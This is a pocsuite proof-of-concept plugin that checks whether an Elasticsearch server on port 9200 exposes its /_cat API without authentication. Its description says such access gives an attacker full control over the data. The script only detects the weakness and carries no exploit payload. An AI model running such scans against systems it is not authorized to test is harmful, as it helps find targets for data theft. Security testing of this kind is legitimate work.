#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
# from pocsuite.poc import POCBase, Output
# from pocsuite.utils import register


from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

#import requests
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0', 'content-type': 'application/json'}


def poc(url):
    a=False
    url=str(url)[7:]
    url="http://"+url+":9200/_cat"
    try:
        res = req.get(url, verify=False, timeout=10, headers=headers)
        response = res.text
        if res.status_code==200 and "/_cat/master" in response:
            a=True
    except Exception:
        response = ""
    return a


class TestPOC(POCBase):
    name = 'liunx_ElasticSearch_Unauthorized_check'
    vulID = 'Unauthorized_check'
    author = ['weihong']
    vulType = 'Unauthorized'
    version = '1.0'  # default version: 1.0
    references = ['']
    desc = '''
            ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。
            Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。
            Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。
            该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。
            业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。
		   '''
    vulDate = '2013-11-20'
    createDate = '2020-03-27'
    updateDate = '2020-03-27'
    appName = 'Liunx ElasticSearch'
    appVersion = 'Liunx ElasticSearch'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        aa = poc(self.url)
        if aa:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' Liunx_ElasticSearch_Unauthorized' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)